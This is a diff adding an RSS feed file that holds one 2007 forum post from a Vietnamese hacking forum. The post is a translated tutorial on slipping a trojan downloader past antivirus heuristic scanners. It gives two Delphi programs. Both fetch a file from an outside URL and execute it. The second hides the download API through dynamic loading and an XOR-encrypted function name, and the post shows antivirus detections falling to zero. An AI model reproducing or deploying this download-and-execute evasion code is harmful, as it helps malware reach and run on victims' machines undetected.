@@ -1,0 +1,125 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Cách vượt qua cơ chế quét heuristic của AV. "]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/23.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Cách vượt qua cơ chế quét heuristic của AV. "]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Cách vượt qua cơ chế quét heuristic của AV. </title>
+				<description><![CDATA[ Tác giả:BuGGz (bài Bypasser L'heuristic des antivirus )
+Người dịch: Tôi.
+
+Cách vượt qua cơ chế quét heuristic của AV. 
+
+Ngày nay, phần lớn các phần mềm Antivirus (AV) đều tích hợp sẵn tính năng quét heuristic để phát hiện các đoạn mã nguy hiểm và các hàm API phổ biến được dùng trong các phần mềm độc hại. Mục đích của tính năng này là phát hiện virus mà không cần thêm chứ kỹ nhận dạng của từng con một. Tính năng này cho phép phát hiện virus trước khi chúng được phát tán công khai. Trong bài viết này tôi sẽ trình bày cách vượt qua cơ chế quét heuristic.
+Làm thế nào chúng ta làm được như vậy ?
+Tôi sẽ sử dụng một ví dụ của Lord, chúng ta sẽ viết một chương trình web downloader sử dụng hàm API ?urldownloadtofile?. Hàm này sẽ bị các cơ chế quét heuristic đánh giá là nguy hiểm.
+
+Chương trình Delphi:
+
+program Project2;
+
+{$APPTYPE CONSOLE}
+
+uses
+URLMon,windows,
+ShellApi,
+SysUtils;
+
+begin
+UrlDownloadToFile(nil, PChar('http://fahde.free.fr/bug/rel/ICrypt%201.0.rar'), PChar('C:\ICrypt.rar'), 0, nil) ;
+ShellExecute(0,'open',PChar('C:\ICrypt.rar'),nil,nil,SW_SHOW);
+
+end.
+
+Sau khi dịch chương trình này, thử quét nó ta sẽ được kết quả như sau (lấy từ virustotal):
+Ikarus: Trojan-Downloader.Win32.Banload.BQ
+Bit defender: BehavesLike:Trojan.Downloader
+NOD32: NewHeur_PE probably unknown virus
+Vậy là ta đã thu được một kết quả không tốt cho mình ? Và ta tự hỏi, làm thế nào mà AV lại phát hiện ra chương trình ta tự viết dù ta chưa hề phát tán nó ?
+Một mình hàm API URLDOWNLOADTOFILE sẽ không bị HS (heuristic scanner) cho là nguy hiểm nhưng nếu kết hợp với ShellExecute thì HS sẽ cho nó là nguy hiểm, chính vì vậy mới cho kết quả như trên. Tôi xin giải thích, khi chương trình của ta gọi hàm URLDOWNLOADTOFILE, nó sẽ không      gọi trực tiếp từ file .DLL chứa hàm(urlmon.dll), thay vào đó nó gọi từ bộ nhớ. Nhưng một exefile/dllfile không biết chỗ nào chứa hàm Shellexecute API ở đâu trong bộ nhớ bởi vậy nó dùng IAT "Importation Address Table". IAT biết chỗ nào trong bộ nhớ chứa API và chương trình của ta truy cập APIs thông qua IAT.
+Giờ ta đã biết HS làm việc thế nào, và đây là lúc ta sẽ vượt qua nó. Mọi hàm API ta sẽ dùng đều được lập danh sách trong IAT, AV quét IAT và nếu thấy  API của ta HS sẽ phát hiện nó ngay. Ta sẽ làm cho API của ta không xuất hiện trong IAT, để làm được điều đó ta sẽ sử dụng 2 API khác mà HS không nghi ngờ là LoadLibrary và GetProcAdress. Hai hàm này sẽ cho phép ta dynamically load file urlmon.dll của hàm UrlDownloadToFile. Và giờ ta sẽ không cần hỏi IAT vị trí của các API ta sẽ dùng.
+
+Viết lại chương trình như sau:
+program Project2;
+
+{$APPTYPE CONSOLE}
+// By BuGGz : www.instinct-coders.tz4.com 
+uses
+windows,messages,dialogs,
+ShellApi,
+SysUtils;
+
+type
+//we declare the function with the correct paramters so we can manipulate it later.
+TMyProc = function(Caller: IUnknown; URL: PChar; FileName: PChar; Reserved: DWORD;LPBINDSTATUSCALLBACK: pointer): HResult; stdcall;
+ // the function for decrypting.
+function Decrypt(Str : String; Key: string): String;
+var
+  Y, Z : Integer;
+  B : Byte;
+begin
+  Z := 1;
+  for Y := 1 to Length(Str) do
+  begin
+    B := (ord(Str[Y]) and $0f) xor (ord(Key[Z]) and $0f);
+     B := b xor 10 ;
+    Str[Y] := char((ord(Str[Y]) and $f0) + B);
+    Inc(Z);
+    If Z &gt; length(Key) then Z := 1;
+  end;
+  Result := Str;
+end;
+
+
+
+var
+Handle: THandle;
+Maproc: TMyProc;
+crypte,decrypte : string;
+begin
+Decrypte := Decrypt(']ZDLgfdgil\gNadmI' ,'2'); 
+showmessage(Decrypte);  //to make sure that the final result is good
+ Handle := loadlibrary('Urlmon.dll'); // load the dll
+
+if Handle &lt;&gt; 0 then
+
+begin
+
+try
+
+//Decrypt then load the function dynamically from the DLL
+@Maproc := GetProcAddress(Handle, pchar(Decrypt(']ZDLgfdgil\gNadmI' ,'2')));
+
+if @Maproc&lt;&gt; nil then
+
+begin
+Maproc(nil,'http://fahde.free.fr/bug/rel/ICrypt%201.0.rar','C:\ICrypt.rar',0, nil); // this is the download function which is renamed to Maproc to avoid detection
+ShellExecute(Handle,'open',PChar('C:\ICrypt.rar'),nil,nil,SW_SHOW); 
+end;
+
+Finally
+
+FreeLibrary(Handle); // free the dll file after we?ve used it.
+
+end;
+end
+
+end.
+
+Quét lại sau khi dịch:
+Ikarus: No virus found in memory
+Bit defender: No virus found in memory
+NOD32 : No virus found in memory
+
+Bản quyền:
+Thuộc về Lord tôi chỉ dịch.
+BuGGz , www.instinct-coders.tz4.com]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/13080.hva#77576</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/13080.hva#77576</link>
+				<pubDate><![CDATA[Tue, 7 Aug 2007 12:32:07]]> GMT</pubDate>
+				<author><![CDATA[ eyesdog]]></author>
+			</item>
+	</channel>
+</rss>
